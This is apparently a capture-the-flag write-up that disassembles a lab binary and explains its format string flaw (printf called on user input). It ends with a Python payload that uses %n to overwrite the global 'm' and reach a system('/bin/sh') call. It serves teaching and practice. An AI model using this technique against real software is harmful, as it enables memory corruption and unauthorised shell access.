# Level 3

## Step 1 : Analyse v() function

```
   0x080484a4 <+0>:	push   ebp
   0x080484a5 <+1>:	mov    ebp,esp
   0x080484a7 <+3>:	sub    esp,0x218
   0x080484ad <+9>:	mov    eax,ds:0x8049860 => stdin
   0x080484b2 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x080484b6 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x080484be <+26>:	lea    eax,[ebp-0x208]
   0x080484c4 <+32>:	mov    DWORD PTR [esp],eax
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    eax,[ebp-0x208]
   0x080484d2 <+46>:	mov    DWORD PTR [esp],eax
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    eax,ds:0x804988c
   0x080484df <+59>:	cmp    eax,0x40
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    eax,ds:0x8049880 => stdout
   0x080484e9 <+69>:	mov    edx,eax
   0x080484eb <+71>:	mov    eax,0x8048600 => "Wait what?!\n"
   0x080484f0 <+76>:	mov    DWORD PTR [esp+0xc],edx
   0x080484f4 <+80>:	mov    DWORD PTR [esp+0x8],0xc
   0x080484fc <+88>:	mov    DWORD PTR [esp+0x4],0x1
   0x08048504 <+96>:	mov    DWORD PTR [esp],eax
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d == "/bin/sh"
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave
   0x08048519 <+117>:	ret
```

This program is getting some user input with `fgets()` (protected function), then uses `printf()` to print the input and compares the value stored at address `0x804988c` with `0x40`. If the value equals `0x40`, it opens a shell with `system()`.

So we need to find out how to change the value at address `0x804988c`.

```
(gdb) x/4s 0x804988c
0x804988c <m>:	 ""
0x804988d <m+1>:	 ""
0x804988e <m+2>:	 ""
0x804988f <m+3>:	 ""
```

It is a global variable. We can verify this with this command :

```
(gdb) i variables
All defined variables:

Non-debugging symbols:
...
0x08049860  stdin@@GLIBC_2.0
0x08049880  stdout@@GLIBC_2.0
0x08049884  completed.6159
0x08049888  dtor_idx.6161
0x0804988c  m
0xb7ffeca0  _rtld_global_ro
0xb7ffee6c  _dl_argv
0xb7ffef10  __libc_stack_end
...
```

I couldn't find any way to modify the value stored in a global variable at runtime.

After some time digging the web, I found out that printf could be expoited if not used correctly. It is called an [uncontrolled format string vulnerability](https://en.wikipedia.org/wiki/Uncontrolled_format_string).

## Step 2 : Exploiting the format string vulnerability

```
printf(buffer) // is vulnerable
printf("%s", buffer) // isn't
```

Reading some documentation on the subject, we understand that the key format tokens are `%n` and `%x`, to write and read the data at a specified address.

`%n` will write the number of bytes that precede this format token at the address provided in the arguments.

Example

```
int n;
printf("123%n", &n) // n == 3 is true
```

What we want to achieve is :

```
printf("imagine that I am a 0x40 bytes long string %n", 0x804988c)
```

`printf()` arguments handling works this way : the pointer to the formated string at `[esp]` and then `nth` arg at `[esp + n * 0x4]`. If there is a format token in the format string,

The buffer used by `printf()` starts at `[esp + 0x10]`, so the 4th argument of the function could also be the first 4 bytes of the buffer string.

```
python -c 'print "\x8c\x98\x04\x08" + "A" * 35 + "%p%p%p%n"'
```
